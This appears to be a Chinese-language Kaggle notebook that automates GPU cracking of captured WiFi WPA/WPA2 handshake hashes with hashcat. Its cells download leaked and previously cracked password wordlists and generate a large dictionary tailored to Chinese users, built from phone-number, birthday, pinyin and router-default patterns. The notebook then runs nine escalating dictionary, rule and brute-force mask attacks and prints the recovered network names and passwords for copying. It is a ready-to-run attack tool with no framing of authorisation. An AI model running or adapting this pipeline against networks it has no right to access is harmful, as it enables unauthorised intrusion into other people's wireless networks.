# WiFi握手包GPU破解 - Kaggle免费GPU加速 v2.0

**核心功能**: 直接粘贴hashline → 自动识别分割 → 批量GPU破解

**使用方法**:
1. 运行 Cell 1-2 安装环境和下载字典（首次约2分钟）
2. 在 Cell 3 的文本框中**直接粘贴**所有hashline（支持一次粘贴几十上百条）
3. 运行后续Cell，自动依次执行 **9轮攻击**

**字典规模（共计约 300万+ 条）**:

| 字典来源 | 条数 | 说明 |
|---------|------|------|
| wpa-sec 全球已破解 | ~75万 | 全球社区GPU破解的真实WiFi密码 |
| Probable-Wordlists WPA | ~20万 | 按概率排序的真实泄露密码（≥8位） |
| SecLists 10K常用 | ~1万 | 全球最常用密码Top10000 |
| 中国定制生成 | ~150万+ | 手机号/生日/拼音/吉利数字/键盘模式/强混合 |
| hashcat规则变异 | ×64倍 | best64规则对字典进行智能变异 |

**攻击策略（9轮递进）**:
```
攻击1: wpa-sec全球字典（~75万条）
攻击2: 中国定制字典（~150万条）
攻击3: Probable-Wordlists WPA字典（~20万条）
攻击4: 全部字典 + best64规则变异（×64倍扩展）
攻击5: 8位纯数字掩码（1亿组合）
攻击6: 常见前缀+数字（a/z/q + 7位数字）
攻击7: 9位纯数字掩码（10亿组合）
攻击8: 手机号模式（1开头+10位数字）
攻击9: 10位纯数字掩码（100亿，需要较长时间）
```

| GPU | WPA速度 | 8位数字 | 9位数字 |
|-----|---------|--------|--------|
| Kaggle T4 | ~80K H/s | ~20分钟 | ~3.5小时 |
| Kaggle P100 | ~120K H/s | ~14分钟 | ~2.3小时 |
| Mac M1 | ~52K H/s | ~32分钟 | ~5.3小时 |

## 1. 环境准备（GPU检测 + hashcat安装）

In [ ]:
# ============================================================================
# 环境准备：GPU检测 + hashcat安装 + 基准测试
# ============================================================================
import os, subprocess, glob, time, sys, re, hashlib

WORK_DIR = '/kaggle/working'
DICT_DIR = os.path.join(WORK_DIR, 'dicts')
os.makedirs(DICT_DIR, exist_ok=True)

# 检测GPU
print('='*60)
print('  GPU信息')
print('='*60)
!nvidia-smi --query-gpu=name,memory.total,driver_version --format=csv,noheader 2>/dev/null || echo '[!] GPU不可用，请在Kaggle Settings中开启GPU加速器'
print()

# 安装hashcat
print('='*60)
print('  安装hashcat')
print('='*60)
!apt-get update -qq > /dev/null 2>&1 && apt-get install -y -qq hashcat > /dev/null 2>&1
!hashcat --version
print()

# 基准测试
print('='*60)
print('  WPA破解速度基准测试 (hashcat -m 22000)')
print('='*60)
!timeout 120 hashcat -b -m 22000 --machine-readable 2>/dev/null | tail -1 || true
!timeout 120 hashcat -b -m 22000 2>/dev/null | grep -E 'Speed|Hash.Mode' || echo '基准测试完成'
print('\n环境准备完成!')

## 2. 下载全网WiFi密码字典（300万+条）

In [ ]:
# ============================================================================
# 下载全网WiFi密码字典 + 生成中国定制强密码混合字典
# ============================================================================

def download_dict(url, save_path, desc):
    """下载字典文件（支持.gz自动解压）"""
    if os.path.exists(save_path):
        lines = int(subprocess.getoutput(f'wc -l < {save_path}').strip() or 0)
        print(f'  [已存在] {desc}: {save_path} ({lines:,} 条)')
        return True
    print(f'  [下载中] {desc}...')
    try:
        if url.endswith('.gz'):
            tmp_gz = save_path + '.gz'
            r = subprocess.run(['wget', '-q', '--timeout=30', url, '-O', tmp_gz],
                              capture_output=True, timeout=120)
            if r.returncode == 0 and os.path.exists(tmp_gz):
                subprocess.run(['gunzip', '-f', tmp_gz], capture_output=True)
                if os.path.exists(save_path):
                    lines = int(subprocess.getoutput(f'wc -l < {save_path}').strip() or 0)
                    print(f'  [完成] {desc}: {lines:,} 条')
                    return True
        else:
            r = subprocess.run(['wget', '-q', '--timeout=60', url, '-O', save_path],
                              capture_output=True, timeout=300)
            if r.returncode == 0 and os.path.exists(save_path):
                lines = int(subprocess.getoutput(f'wc -l < {save_path}').strip() or 0)
                print(f'  [完成] {desc}: {lines:,} 条')
                return True
    except Exception as e:
        print(f'  [失败] {desc}: {e}')
    return False

# ── 字典1: wpa-sec全球已破解密码（约75万条） ──
print('='*60)
print('  字典下载')
print('='*60)
DICT_WPASEC = os.path.join(DICT_DIR, 'wpa-sec-cracked.txt')
download_dict(
    'https://wpa-sec.stanev.org/dict/cracked.txt.gz',
    DICT_WPASEC, 'wpa-sec全球已破解WiFi密码（~75万条）'
)

# ── 字典2: Probable-Wordlists WPA专用（约20万条，真实泄露密码≥8位） ──
DICT_PROBABLE = os.path.join(DICT_DIR, 'probable-wpa.txt')
download_dict(
    'https://raw.githubusercontent.com/berzerk0/Probable-Wordlists/master/Real-Passwords/WPA-Length/Top204Thousand-WPA-probable-v2.txt',
    DICT_PROBABLE, 'Probable-Wordlists WPA专用（~20万条真实密码）'
)

# ── 字典3: SecLists 10K最常用密码 ──
DICT_SECLISTS = os.path.join(DICT_DIR, 'seclists-10k.txt')
download_dict(
    'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt',
    DICT_SECLISTS, 'SecLists Top10000常用密码'
)

# ── 字典4: SecLists xato 1000万密码（大字典） ──
DICT_XATO = os.path.join(DICT_DIR, 'xato-10m.txt')
download_dict(
    'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/xato-net-10-million-passwords.txt',
    DICT_XATO, 'SecLists xato 1000万密码'
)

# ============================================================================
# 字典5: 中国定制强密码混合字典（本地生成，约150万条）
# 覆盖：手机号后8位、生日全格式、拼音+数字、字母数字混合、
#       吉利数字、键盘模式、品牌默认密码、强混合密码
# ============================================================================
DICT_CHINA = os.path.join(DICT_DIR, 'china-wifi-mega.txt')

if os.path.exists(DICT_CHINA):
    lines = int(subprocess.getoutput(f'wc -l < {DICT_CHINA}').strip() or 0)
    print(f'  [已存在] 中国定制强密码字典: {lines:,} 条')
else:
    print('  [生成中] 中国定制强密码混合字典（约150万条）...')
    _seen = set()
    _results = []
    
    def add(s):
        """添加密码（去重，≥8位）"""
        if len(s) >= 8 and s not in _seen:
            _seen.add(s)
            _results.append(s)
    
    # ── 第1层：8位纯数字高频模式 ──
    # 重复数字
    for d in '0123456789':
        add(d * 8)
        add(d * 9)
        add(d * 10)
    # 递增递减
    for start in range(10):
        add(''.join(str((start+i)%10) for i in range(8)))
        add(''.join(str((start-i)%10) for i in range(8)))
        add(''.join(str((start+i)%10) for i in range(9)))
        add(''.join(str((start+i)%10) for i in range(10)))
    # AABBCCDD格式
    for a in range(10):
        for b in range(10):
            for c in range(10):
                for d in range(10):
                    add(f'{a}{a}{b}{b}{c}{c}{d}{d}')
    # ABCDABCD格式
    for n in range(10000):
        s = f'{n:04d}'
        add(s + s)
    # ABABABAB格式
    for n in range(100):
        s = f'{n:02d}'
        add(s*4)
    # 回文数字
    for n in range(10000):
        s = f'{n:04d}'
        add(s + s[::-1])
    
    # ── 第2层：生日全格式 ──
    for y in range(1960, 2012):
        for m in range(1, 13):
            for d in range(1, 32):
                if m in (4,6,9,11) and d > 30: continue
                if m == 2 and d > 29: continue
                add(f'{y:04d}{m:02d}{d:02d}')       # YYYYMMDD
                add(f'{m:02d}{d:02d}{y:04d}')       # MMDDYYYY
                add(f'{d:02d}{m:02d}{y:04d}')       # DDMMYYYY
                yy = f'{y%100:02d}'
                add(f'{yy}{m:02d}{d:02d}00')        # YYMMDD00
                add(f'{yy}{m:02d}{d:02d}01')        # YYMMDD01
                add(f'19{yy}{m:02d}{d:02d}')        # 固定19前缀
                add(f'20{yy}{m:02d}{d:02d}')        # 固定20前缀
    
    # ── 第3层：手机号（11位，高频尾号） ──
    prefixes = [
        '130','131','132','133','134','135','136','137','138','139',
        '147','150','151','152','153','155','156','157','158','159',
        '165','166','170','171','172','173','175','176','177','178',
        '180','181','182','183','184','185','186','187','188','189',
        '190','191','192','193','195','196','197','198','199',
    ]
    hot_tails = [
        '00000000','11111111','22222222','33333333','44444444',
        '55555555','66666666','77777777','88888888','99999999',
        '12345678','87654321','11223344','12341234','00001234',
        '88886666','66668888','13141314','52015201','00008888',
    ]
    for pf in prefixes:
        for tail in hot_tails:
            add(pf + tail[:8])
    
    # ── 第4层：情感数字 ──
    for i in range(100000):
        add(f'520{i:05d}')
        add(f'{i:05d}520')
    for i in range(10000):
        add(f'1314{i:04d}')
        add(f'{i:04d}1314')
    love_combos = ['520','1314','521','5201314','1314520','5200','8888','6666','9999']
    for a in love_combos:
        for b in love_combos:
            s = a + b
            add(s)
    
    # ── 第5层：拼音+数字混合（强密码） ──
    pinyins = [
        'woaini','woshishui','nihao','mima','mimamima','zhangsan','lisi',
        'wangwu','baobei','laogong','laopo','meimei','gege','mama','baba',
        'kuaile','youxi','diannao','shouji','wechat','weixin','taobao',
        'jiayou','xingfu','aiqing','pengyou','tongxue','xiaoming','xiaohong',
        'wangjun','zhangwei','liming','qinaide','woaiwo','zhangli','chenwei',
        'liuyang','wangfang','zhaojie','sunli','huangjie','zhoujie',
    ]
    num_sfx = [
        '123','1234','12345','123456','1234567','12345678',
        '111','888','666','520','1314','0000','9999','2024','2025','2026',
        '1988','1990','1991','1992','1993','1994','1995','1996','1997',
        '1998','1999','2000','2001','2002','2003','2004','2005',
        '01','02','11','12','88','99','00','!','@','#',
    ]
    for py in pinyins:
        for sfx in num_sfx:
            add(py + sfx)
            add(py.capitalize() + sfx)
            add(py.upper() + sfx)
        if len(py) >= 8:
            add(py)
        # 拼音+拼音
        for py2 in pinyins[:15]:
            s = py + py2
            if len(s) >= 8:
                add(s[:14])
    
    # ── 第6层：字母+数字强混合（中国人常用模式） ──
    # 单字母+7/8位数字
    for c in 'abcdefghijklmnopqrstuvwxyz':
        for num in ['1234567','12345678','123456789','1234567890',
                    '11111111','88888888','00000000','66666666',
                    '12341234','87654321','23456789']:
            add(c + num)
            add(num + c)
    # 双字母+6/7位数字
    for c1 in 'abcdefghijklmnopqrstuvwxyz':
        for c2 in 'abcdefghijklmnopqrstuvwxyz':
            for num in ['123456','1234567','888888','666666','000000','112233']:
                add(c1+c2+num)
    
    # ── 第7层：键盘模式 ──
    kb_patterns = [
        'qwertyui','qwertyuiop','asdfghjk','asdfghjkl','zxcvbnm1',
        'qweasdzxc','1qaz2wsx','3edc4rfv','q1w2e3r4','1q2w3e4r',
        'qazwsxed','1234qwer','qwer1234','asdf1234','zxcv1234',
        'a1s2d3f4','qwerty12','qwerty123','1234!@#$','abcd1234',
        'qwertyuiop1','asdfghjkl1','1qazxsw2','!QAZ@WSX',
        'qwerty1234','asdfghjk1','zxcvbnm12','poiuytrewq',
    ]
    for p in kb_patterns:
        if len(p) >= 8: add(p)
        if len(p) >= 8: add(p.upper())
    
    # ── 第8层：品牌路由器默认密码 ──
    router_defaults = [
        'admin1234','admin12345','admin123456','admin888','admin666',
        'tp-link1234','tplink1234','tplink123','tplink12345',
        'password1','password12','password123','password1234',
        'huawei1234','huawei123','zte123456','xiaomi1234',
        'mercury123','mercury1234','fast1234','tenda1234',
        'wireless1','wireless12','wireless123','changeme1',
        'default123','router123','netgear123','linksys123',
        'dlink1234','asus1234','comfast123','wavlink123',
    ]
    for p in router_defaults:
        add(p)
    
    # ── 第9层：常见4位模式组合成8位以上 ──
    patterns_4 = ['0000','1111','2222','3333','4444','5555','6666','7777',
                  '8888','9999','1234','5678','9012','1314','0520','5201']
    for p1 in patterns_4:
        for p2 in patterns_4:
            add(p1 + p2)
            add(p1 + p2 + '00')
        for n in range(10000):
            add(p1 + f'{n:04d}')
    
    # ── 第10层：常见弱密码及变体 ──
    weak = [
        'password','password1','password123','12345678','123456789',
        '1234567890','qwerty123','iloveyou1','abc12345','abc123456',
        'a12345678','aa123456','letmein123','welcome123','monkey123',
        'dragon123','master123','superman1','football1','baseball1',
        'shadow123','sunshine1','passw0rd1','p@ssw0rd1','test1234',
        'wifi12345','wifi123456','wlan12345','internet1','computer1',
        'windows123','linux1234','root12345','home12345',
    ]
    for w in weak:
        add(w)
        add(w + '!')
        add(w + '@')
        add(w + '#')
    
    # 写入文件
    with open(DICT_CHINA, 'w', encoding='utf-8') as f:
        f.write('\n'.join(_results) + '\n')
    print(f'  [完成] 中国定制强密码字典: {len(_results):,} 条')
    del _seen, _results  # 释放内存

# ── 统计所有字典 ──
print()
print('='*60)
print('  字典汇总')
print('='*60)
total_lines = 0
all_dicts = []
for name, path in [
    ('wpa-sec全球已破解', DICT_WPASEC),
    ('中国定制强密码', DICT_CHINA),
    ('Probable-Wordlists WPA', DICT_PROBABLE),
    ('SecLists Top10K', DICT_SECLISTS),
    ('SecLists xato 10M', DICT_XATO),
]:
    if os.path.exists(path):
        lines = int(subprocess.getoutput(f'wc -l < {path}').strip() or 0)
        size_mb = os.path.getsize(path) / 1024 / 1024
        print(f'  {name:30s} {lines:>12,} 条  ({size_mb:.1f} MB)')
        total_lines += lines
        all_dicts.append(path)

print(f'  {"─"*56}')
print(f'  {"合计":30s} {total_lines:>12,} 条')
print(f'  可用字典文件: {len(all_dicts)} 个')

## 3. 粘贴握手包hashline（自动分割识别）

**直接在下方代码的 `RAW_PASTE` 变量中粘贴所有hashline**

支持的格式：
- 一次粘贴多条，每行一条
- 混合粘贴PMKID和EAPoL握手包
- 自动过滤空行、注释行、无效行
- 自动去重

**hashline格式示例**：
```
WPA*01*aabbccdd...*112233445566*aabbccddeeff*SSID的hex编码
WPA*02*aabbccdd...*112233445566*aabbccddeeff*SSID的hex编码*...
```

In [ ]:
# ============================================================================
# 握手包加载：直接粘贴hashline，自动分割识别，批量加载
# ============================================================================

# ╔══════════════════════════════════════════════════════════════════╗
# ║  在下方三引号中直接粘贴所有hashline（支持一次粘贴几十上百条）   ║
# ║  每行一条，自动过滤空行/注释行/无效行，自动去重               ║
# ╚══════════════════════════════════════════════════════════════════╝
RAW_PASTE = """
在这里粘贴你的hashline，直接全选粘贴即可，例如：
WPA*01*aabbccddaabbccdd*112233445566*aabbccddeeff*54502d4c494e4b5f41424344
WPA*02*aabbccddaabbccdd*112233445566*aabbccddeeff*54502d4c494e4b5f41424344*aabbccddaabbccddaabbccddaabbccddaabbccddaabbccddaabbccddaabbccddaabbccddaabbccddaabbccddaabbccdd*0000000000000000000000000000000000000000000000000000000000000000*000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000*02
"""

# ============================================================================
# 自动分割识别引擎
# ============================================================================
def parse_hashlines(raw_text):
    """
    智能解析粘贴的hashline文本
    支持：多行粘贴、混合格式、自动清洗
    返回：去重后的有效hashline列表 + 解析报告
    """
    seen = set()
    valid = []
    invalid_count = 0
    duplicate_count = 0
    
    # 按行分割（支持\n \r\n \r）
    lines = re.split(r'[\r\n]+', raw_text)
    
    for line in lines:
        line = line.strip()
        
        # 跳过空行
        if not line:
            continue
        # 跳过注释行
        if line.startswith('#') or line.startswith('//') or line.startswith('在这里'):
            continue
        
        # 提取WPA*开头的hashline（一行中可能有多条用空格分隔）
        # 也处理行内可能有制表符或多空格的情况
        segments = re.split(r'[\t ]+', line)
        for seg in segments:
            seg = seg.strip()
            if not seg.startswith('WPA*'):
                continue
            
            # 验证基本格式：WPA*类型*...至少6个*分隔字段
            parts = seg.split('*')
            if len(parts) < 6:
                invalid_count += 1
                continue
            
            # 验证类型字段：01=PMKID, 02=EAPoL
            if parts[1] not in ('01', '02'):
                invalid_count += 1
                continue
            
            # 去重（用完整hashline作为key）
            if seg in seen:
                duplicate_count += 1
                continue
            
            seen.add(seg)
            valid.append(seg)
    
    return valid, invalid_count, duplicate_count

# 执行解析
hashlines, n_invalid, n_dup = parse_hashlines(RAW_PASTE)

# 同时扫描Kaggle Dataset中的.22000文件
dataset_lines = []
for search_dir in ['/kaggle/input', '/kaggle/working']:
    for ext in ['*.22000', '*.hc22000']:
        for fpath in glob.glob(f'{search_dir}/**/{ext}', recursive=True):
            with open(fpath) as f:
                for line in f:
                    line = line.strip()
                    if line.startswith('WPA*') and line not in set(hashlines):
                        dataset_lines.append(line)

# 合并所有来源
all_hashlines = hashlines + dataset_lines

# 写入合并文件
ALL_HASHES = os.path.join(WORK_DIR, 'all_hashes.22000')
with open(ALL_HASHES, 'w') as out:
    for h in all_hashlines:
        out.write(h + '\n')

# ── 解析并展示目标信息 ──
print('='*60)
print('  握手包加载报告')
print('='*60)
print(f'  粘贴解析: {len(hashlines)} 条有效'
      f'{f", {n_dup} 条重复已去除" if n_dup else ""}'
      f'{f", {n_invalid} 条无效已过滤" if n_invalid else ""}')
if dataset_lines:
    print(f'  Dataset扫描: {len(dataset_lines)} 条（来自.22000文件）')
print(f'  合计加载: {len(all_hashlines)} 个WiFi握手包哈希')
print()

# 详细列表
pmkid_count = 0
eapol_count = 0
if all_hashlines:
    print(f'  {"#":>4s}  {"SSID":<28s}  {"BSSID":<19s}  {"类型":<10s}')
    print(f'  {"─"*4}  {"─"*28}  {"─"*19}  {"─"*10}')
    for idx, h in enumerate(all_hashlines):
        parts = h.split('*')
        if len(parts) >= 6:
            htype = 'PMKID' if parts[1] == '01' else 'EAPoL握手'
            if parts[1] == '01': pmkid_count += 1
            else: eapol_count += 1
            try:
                ssid = bytes.fromhex(parts[5]).decode('utf-8', errors='replace')
            except:
                ssid = parts[5][:28]
            mac_raw = parts[3] if len(parts[3]) >= 12 else '000000000000'
            mac_ap = ':'.join(mac_raw[j:j+2] for j in range(0, 12, 2))
            print(f'  {idx+1:>4d}  {ssid:<28s}  {mac_ap:<19s}  {htype}')
    print()
    print(f'  PMKID: {pmkid_count} 个 | EAPoL握手: {eapol_count} 个')
else:
    print('  [!] 未找到任何握手包！')
    print('  [!] 请在上方 RAW_PASTE 变量中粘贴hashline后重新运行此Cell')

## 4. hashcat GPU批量破解（9轮递进攻击）

In [ ]:
# ============================================================================
# hashcat GPU批量破解：9轮递进攻击
# 字典攻击 → 规则变异 → 掩码暴力（从快到慢）
# ============================================================================

OUTFILE = os.path.join(WORK_DIR, 'cracked_passwords.txt')
POTFILE = os.path.join(WORK_DIR, 'hashcat.potfile')

# 清理旧结果
for f in [OUTFILE, POTFILE]:
    if os.path.exists(f):
        os.remove(f)

def run_hashcat(attack_name, extra_args, timeout_sec=7200):
    """
    运行hashcat单轮攻击
    返回: (all_cracked, newly_cracked_count)
    """
    print(f'\n{"="*60}')
    print(f'  {attack_name}')
    print(f'{"="*60}')
    
    cmd = [
        'hashcat', '-m', '22000',
        ALL_HASHES,
        '--potfile-path', POTFILE,
        '--outfile', OUTFILE,
        '--outfile-format', '2',
        '-w', '3',
        '-O',
        '--quiet',
    ] + extra_args
    
    start_time = time.time()
    
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout_sec)
        output = result.stdout + result.stderr
        elapsed = time.time() - start_time
    except subprocess.TimeoutExpired:
        elapsed = time.time() - start_time
        print(f'  [!] 超时（{timeout_sec//60}分钟），跳过')
        print(f'  耗时: {elapsed:.0f}秒')
        return False, 0
    
    # 提取关键信息
    for line in output.split('\n'):
        line_s = line.strip()
        if any(kw in line_s for kw in ['Speed', 'Recovered', 'Progress', 'Candidates']):
            print(f'  {line_s}')
    
    print(f'  耗时: {elapsed:.1f}秒')
    
    # 统计本轮新破解数
    newly = 0
    if os.path.exists(POTFILE):
        with open(POTFILE) as f:
            newly = sum(1 for _ in f)
    
    # hashcat返回码: 0=至少破解一个, 1=全部穷尽未破解
    if result.returncode == 0 or 'Cracked' in output:
        # 检查是否全部破解
        if 'All hashes found' in output:
            print(f'  >>> 全部 {len(all_hashlines)} 个握手包已破解! <<<')
            return True, newly
        print(f'  >>> 发现密码! (已破解 {newly} 个) <<<')
        return False, newly
    
    return False, newly

def show_progress():
    """显示当前破解进度"""
    if not os.path.exists(POTFILE):
        return
    cracked = 0
    with open(POTFILE) as f:
        cracked = sum(1 for _ in f)
    if cracked > 0:
        print(f'\n  ── 当前进度: {cracked}/{len(all_hashlines)} 个已破解 ──')

# ============================================================================
# 开始9轮递进攻击
# ============================================================================
print('='*60)
print(f'  开始批量破解 {len(all_hashlines)} 个WiFi握手包')
print(f'  攻击策略: 字典(4轮) → 掩码暴力(5轮)')
print('='*60)

attack_start = time.time()
all_done = False

# ── 攻击1: wpa-sec全球已破解字典（~75万条，约15秒） ──
if not all_done and os.path.exists(DICT_WPASEC):
    all_done, _ = run_hashcat(
        '攻击1/9: wpa-sec全球已破解WiFi密码（~75万条）',
        ['-a', '0', DICT_WPASEC]
    )
    show_progress()

# ── 攻击2: 中国定制强密码字典（~150万条） ──
if not all_done and os.path.exists(DICT_CHINA):
    all_done, _ = run_hashcat(
        '攻击2/9: 中国定制强密码混合字典（~150万条）',
        ['-a', '0', DICT_CHINA]
    )
    show_progress()

# ── 攻击3: Probable-Wordlists WPA + SecLists ──
if not all_done:
    extra_dicts = [d for d in [DICT_PROBABLE, DICT_SECLISTS, DICT_XATO] if os.path.exists(d)]
    if extra_dicts:
        # 合并为一个临时文件
        merged = os.path.join(WORK_DIR, 'merged_extra.txt')
        !cat {' '.join(extra_dicts)} | sort -u > {merged}
        lines = int(subprocess.getoutput(f'wc -l < {merged}').strip() or 0)
        all_done, _ = run_hashcat(
            f'攻击3/9: Probable + SecLists + xato 合并字典（{lines:,}条）',
            ['-a', '0', merged]
        )
        show_progress()

# ── 攻击4: 全部字典 + best64规则变异（×64倍扩展） ──
if not all_done:
    # 合并所有字典
    all_merged = os.path.join(WORK_DIR, 'all_merged.txt')
    existing = [d for d in all_dicts if os.path.exists(d)]
    if existing:
        !cat {' '.join(existing)} | sort -u > {all_merged}
        # 查找best64规则文件
        rule_file = ''
        for rp in ['/usr/share/hashcat/rules/best64.rule',
                    '/usr/local/share/hashcat/rules/best64.rule']:
            if os.path.exists(rp):
                rule_file = rp
                break
        if rule_file:
            total = int(subprocess.getoutput(f'wc -l < {all_merged}').strip() or 0)
            all_done, _ = run_hashcat(
                f'攻击4/9: 全字典({total:,}条) + best64规则变异（×64倍）',
                ['-a', '0', all_merged, '-r', rule_file],
                timeout_sec=3600  # 1小时超时
            )
        else:
            print('\n  [!] 未找到best64.rule规则文件，跳过规则变异攻击')
        show_progress()

# ── 攻击5: 8位纯数字掩码（1亿组合，T4约20分钟） ──
if not all_done:
    all_done, _ = run_hashcat(
        '攻击5/9: 8位纯数字掩码（00000000-99999999，1亿组合）',
        ['-a', '3', '?d?d?d?d?d?d?d?d']
    )
    show_progress()

# ── 攻击6: 常见前缀+数字掩码（字母+7位数字，中国常见模式） ──
if not all_done:
    # 写入掩码文件：a?d?d?d?d?d?d?d 到 z?d?d?d?d?d?d?d
    mask_file = os.path.join(WORK_DIR, 'prefix_masks.hcmask')
    with open(mask_file, 'w') as f:
        for c in 'aqzwsxedcrfvtgbyhnujm':  # 常用首字母
            f.write(f'{c}?d?d?d?d?d?d?d\n')       # 字母+7位数字=8位
            f.write(f'{c.upper()}?d?d?d?d?d?d?d\n')
    all_done, _ = run_hashcat(
        '攻击6/9: 常见字母前缀+7位数字掩码（中国常见模式）',
        ['-a', '3', mask_file],
        timeout_sec=3600
    )
    show_progress()

# ── 攻击7: 9位纯数字掩码（10亿组合，T4约3.5小时） ──
if not all_done:
    all_done, _ = run_hashcat(
        '攻击7/9: 9位纯数字掩码（10亿组合，需要较长时间）',
        ['-a', '3', '?d?d?d?d?d?d?d?d?d'],
        timeout_sec=14400  # 4小时超时
    )
    show_progress()

# ── 攻击8: 手机号模式（1开头+10位数字） ──
if not all_done:
    all_done, _ = run_hashcat(
        '攻击8/9: 手机号模式（1?d?d?d?d?d?d?d?d?d?d）',
        ['-a', '3', '1?d?d?d?d?d?d?d?d?d?d'],
        timeout_sec=14400
    )
    show_progress()

# ── 攻击9: 10位纯数字（100亿组合，需要很长时间） ──
if not all_done:
    all_done, _ = run_hashcat(
        '攻击9/9: 10位纯数字掩码（100亿组合，可能需要很长时间）',
        ['-a', '3', '?d?d?d?d?d?d?d?d?d?d'],
        timeout_sec=21600  # 6小时超时
    )

# ── 攻击完成汇总 ──
total_elapsed = time.time() - attack_start
print(f'\n{"="*60}')
print(f'  全部 9 轮攻击完成')
print(f'  总耗时: {total_elapsed/60:.1f} 分钟')
print(f'{"="*60}')

## 5. 查看破解结果

In [ ]:
# ============================================================================
# 破解结果展示
# ============================================================================

print('='*60)
print('  WiFi握手包GPU破解结果')
print('='*60)
print()

# 从potfile读取结果（格式：完整hashline:password）
cracked = []
if os.path.exists(POTFILE):
    with open(POTFILE) as f:
        for line in f:
            line = line.strip()
            if ':' in line:
                parts = line.rsplit(':', 1)
                if len(parts) == 2:
                    hash_part = parts[0]
                    password = parts[1]
                    # 从hash中提取SSID和BSSID
                    hp = hash_part.split('*')
                    ssid = ''
                    bssid = ''
                    htype = ''
                    if len(hp) >= 6:
                        htype = 'PMKID' if hp[1] == '01' else 'EAPoL'
                        try:
                            ssid = bytes.fromhex(hp[5]).decode('utf-8', errors='replace')
                        except:
                            ssid = hp[5]
                        if len(hp[3]) >= 12:
                            bssid = ':'.join(hp[3][j:j+2] for j in range(0, 12, 2))
                    cracked.append({
                        'ssid': ssid, 'password': password,
                        'bssid': bssid, 'type': htype
                    })

if cracked:
    print(f'  成功破解 {len(cracked)}/{len(all_hashlines)} 个WiFi密码!\n')
    print(f'  {"#":>4s}  {"SSID":<24s}  {"密码":<20s}  {"BSSID":<19s}  {"类型"}')
    print(f'  {"─"*4}  {"─"*24}  {"─"*20}  {"─"*19}  {"─"*6}')
    for i, c in enumerate(cracked):
        print(f'  {i+1:>4d}  {c["ssid"]:<24s}  {c["password"]:<20s}  {c["bssid"]:<19s}  {c["type"]}')
    
    # 单独列出密码方便复制
    print(f'\n  {"="*40}')
    print(f'  密码汇总（方便复制）:')
    print(f'  {"="*40}')
    for c in cracked:
        print(f'  {c["ssid"]}: {c["password"]}')
    
    # 未破解的
    uncracked = len(all_hashlines) - len(cracked)
    if uncracked > 0:
        print(f'\n  [!] 还有 {uncracked} 个未破解')
        print(f'  建议: 尝试更大的字典或更复杂的掩码组合')
else:
    print('  未破解任何密码。\n')
    print('  可能原因:')
    print('    - 密码是强密码（字母+数字+符号混合且较长）')
    print('    - 密码不在字典中且不是纯数字')
    print('    - 握手包数据不完整或损坏')
    print()
    print('  建议:')
    print('    - 重新捕获握手包（确保完整的四次握手或PMKID）')
    print('    - 使用更大的字典（如rockyou.txt 14GB版本）')
    print('    - 尝试组合攻击: hashcat -a 1 dict1.txt dict2.txt')
    print('    - 对于中文SSID路由器，密码大概率是8位纯数字（攻击5已覆盖）')

# 也用hashcat --show查看
print(f'\n{"="*60}')
print('  hashcat --show 原始输出')
print(f'{"="*60}')
!hashcat -m 22000 {ALL_HASHES} --potfile-path {POTFILE} --show 2>/dev/null || echo '  无结果'